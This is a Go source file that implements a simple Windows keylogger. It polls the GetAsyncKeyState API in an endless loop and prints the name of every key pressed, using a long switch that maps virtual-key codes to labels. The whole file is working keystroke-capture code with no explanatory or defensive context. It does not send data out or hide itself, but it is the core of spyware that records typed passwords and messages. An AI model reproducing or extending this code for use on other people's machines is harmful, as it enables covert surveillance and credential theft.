import (
    "fmt"
    "syscall"
)

var (
    dllUser32            = syscall.NewLazyDLL("user32.dll")
    procGetAsyncKeyState = dllUser32.NewProc("GetAsyncKeyState")
)

func main() {
    for {
        for keyValue := 0; keyValue <= 256; keyValue++ {
            ret, _, _ := procGetAsyncKeyState.Call(uintptr(keyValue))
            
            // this value may change between machines
            if int(ret) == 32769 {
                fmt.Print(getKeyName(keyValue) + " ")
            }
        }
    }
}

func getKeyName(keyValue int) string {
    switch keyValue {
    case 0x01:
        return "[LEFT_MOUSE_BUTTON]"
    case 0x02:
        return "[RIGHT_MOUSE_BUTTON]"
    case 0x03:
        return "[CANCEL]"
    case 0x04:
        return "[MIDDLE_MOUSE_BUTTON]"
    case 0x05:
        return "[XBUTTON1]"
    case 0x06:
        return "[XBUTTON2]"
    case 0x08:
        return "[BACKSPACE]"
    case 0x09:
        return "[TAB]"
    case 0x0C:
        return "[CLEAR]"
    case 0x0D:
        return "[RETURN]"
    case 0x10:
        return "[SHIFT]"
    case 0x11:
        return "[CONTROL]"
    case 0x12:
        return "[MENU]"
    case 0x13:
        return "[PAUSE]"
    case 0x14:
        return "[CAPS_LOCK]"
    case 0x15:
        return "[KANA]"
    case 0x17:
        return "[JUNJA]"
    case 0x18:
        return "[FINAL]"
    case 0x19:
        return "[KANJI]"
    case 0x1B:
        return "[ESCAPE]"
    case 0x1C:
        return "[CONVERT]"
    case 0x1D:
        return "[NONCONVERT]"
    case 0x1E:
        return "[ACCEPT]"
    case 0x1F:
        return "[MODECHANGE]"
    case 0x20:
        return "[SPACE]"
    case 0x21:
        return "[PRIOR]"
    case 0x22:
        return "[NEXT]"
    case 0x23:
        return "[END]"
    case 0x24:
        return "[HOME]"
    case 0x25:
        return "[LEFT]"
    case 0x26:
        return "[UP]"
    case 0x27:
        return "[RIGHT]"
    case 0x28:
        return "[DOWN]"
    case 0x29:
        return "[SELECT]"
    case 0x2A:
        return "[PRINT]"
    case 0x2B:
        return "[EXECUTE]"
    case 0x2C:
        return "[SNAPSHOT]"
    case 0x2D:
        return "[INSERT]"
    case 0x2E:
        return "[DELETE]"
    case 0x5B:
        return "[LWIN]"
    case 0x5D:
        return "[RWIN]"
    case 0x5F:
        return "[SLEEP]"
    case 0x60:
        return "[NUMPAD0]"
    case 0x61:
        return "[NUMPAD1]"
    case 0x62:
        return "[NUMPAD2]"
    case 0x63:
        return "[NUMPAD3]"
    case 0x64:
        return "[NUMPAD4]"
    case 0x65:
        return "[NUMPAD5]"
    case 0x66:
        return "[NUMPAD6]"
    case 0x67:
        return "[NUMPAD7]"
    case 0x68:
        return "[NUMPAD8]"
    case 0x69:
        return "[NUMPAD9]"
    case 0x6A:
        return "[MULTIPLY]"
    case 0x6B:
        return "[ADD]"
    case 0x6C:
        return "[SEPARATOR]"
    case 0x6D:
        return "[SUBTRACT]"
    case 0x6E:
        return "[DECIMAL]"
    case 0x6F:
        return "[DIVIDE]"
    case 0x70:
        return "[F1]"
    case 0x71:
        return "[F2]"
    case 0x72:
        return "[F3]"
    case 0x73:
        return "[F4]"
    case 0x74:
        return "[F5]"
    case 0x75:
        return "[F6]"
    case 0x76:
        return "[F7]"
    case 0x77:
        return "[F8]"
    case 0x78:
        return "[F9]"
    case 0x79:
        return "[F10]"
    case 0x7A:
        return "[F11]"
    case 0x7B:
        return "[F12]"
    case 0x7C:
        return "[F13]"
    case 0x7D:
        return "[F14]"
    case 0x7E:
        return "[F15]"
    case 0x7F:
        return "[F16]"
    case 0x80:
        return "[F17]"
    case 0x81:
        return "[F18]"
    case 0x82:
        return "[F19]"
    case 0x83:
        return "[F20]"
    case 0x84:
        return "[F21]"
    case 0x85:
        return "[F22]"
    case 0x86:
        return "[F23]"
    case 0x87:
        return "[F24]"
    case 0x90:
        return "[NUMLOCK]"
    case 0x91:
        return "[SCROLL]"
    case 0x92:
        return "[OEM_NEC_EQUAL]"
    case 0x93:
        return "[OEM_FJ_JISHO]"
    case 0x94:
        return "[OEM_FJ_TOUROKU]"
    case 0x95:
        return "[OEM_FJ_LOYA]"
    case 0x96:
        return "[OEM_FJ_ROYA]"
    case 0xA0:
        return "[LSHIFT]"
    case 0xA1:
        return "[RSHIFT]"
    case 0xA2:
        return "[LCONTROL]"
    case 0xA3:
        return "[RCONTROL]"
    case 0xA4:
        return "[LMENU]"
    case 0xA5:
        return "[RMENU]"
    case 0xA6:
        return "[BROWSER_BACK]"
    case 0xA7:
        return "[BROWSER_FORWARD]"
    case 0xA8:
        return "[BROWSER_REFERSH]"
    case 0xA9:
        return "[BROWSER_STOP]"
    case 0xAA:
        return "[BROWSER_SEARCH]"
    case 0xAB:
        return "[BROWSER_FAVORITES]"
    case 0xAC:
        return "[BROWSER_HOME]"
    case 0xAD:
        return "[VOLUME_MUTE]"
    case 0xAE:
        return "[VOLUME_DOWN]"
    case 0xAF:
        return "[VOLUME_UP]"
    case 0xB0:
        return "[MEDIA_NEXT_TRACK]"
    case 0xB1:
        return "[MEDIA_PREVIOUS_TRACK]"
    case 0xB2:
        return "[MEDIA_STOP]"
    case 0xB3:
        return "[MEDIA_PLAY_PAUSE]"
    case 0xB4:
        return "[LAUNCH_MAIL]"
    case 0xB5:
        return "[LAUNCH_MEDIA_SELECT]"
    case 0xB6:
        return "[LAUNCH_APP1]"
    case 0xB7:
        return "[LAUNCH_APP2]"
    case 0xBA:
        return "[OEM_1]"
    case 0xBB:
        return "[OEM_PLUS]"
    case 0xBC:
        return "[OEM_COMMA]"
    case 0xBD:
        return "[OEM_MINUS]"
    case 0xBE:
        return "[OEM_PERIOD]"
    case 0xBF:
        return "[OEM_2]"
    case 0xC0:
        return "[OEM_3]"
    case 0xDB:
        return "[OEM_4]"
    case 0xDC:
        return "[OEM_5]"
    case 0xDD:
        return "[OEM_6]"
    case 0xDE:
        return "[OEM_7]"
    case 0xDF:
        return "[OEM_8]"
    case 0xE1:
        return "[OEM_AX]"
    case 0xE2:
        return "[OEM_102]"
    case 0xE3:
        return "[ICO_HELP]"
    case 0xE4:
        return "[ICO_00]"
    case 0xE5:
        return "[PROCESSKEY]"
    case 0xE6:
        return "[ICO_CLEAR]"
    case 0xE7:
        return "[PACKET]"
    case 0xE9:
        return "[OEM_RESET]"
    case 0xEA:
        return "[OEM_JUMP]"
    case 0xEB:
        return "[OEM_PA1]"
    case 0xEC:
        return "[OEM_PA2]"
    case 0xED:
        return "[OEM_PA3]"
    case 0xEE:
        return "[OEM_WSCTRL]"
    case 0xEF:
        return "[OEM_CUSEL]"
    case 0xF0:
        return "[OEM_ATTN]"
    case 0xF1:
        return "[OEM_FINISH]"
    case 0xF2:
        return "[OEM_COPY]"
    case 0xF3:
        return "[OEM_AUTO]"
    case 0xF4:
        return "[OEM_ENLW]"
    case 0xF5:
        return "[OEM_BACKTAB]"
    case 0xF6:
        return "[ATTN]"
    case 0xF7:
        return "[CRSEL]"
    case 0xF8:
        return "[EXSEL]"
    case 0xF9:
        return "[EREOF]"
    case 0xFA:
        return "[PLAY]"
    case 0xFB:
        return "[ZOOM]"
    case 0xFC:
        return "[NONAME]"
    case 0xFD:
        return "[PA1]"
    case 0xFE:
        return "[OEM_CLEAR]"
    default:
        return string(keyValue)
    }
}
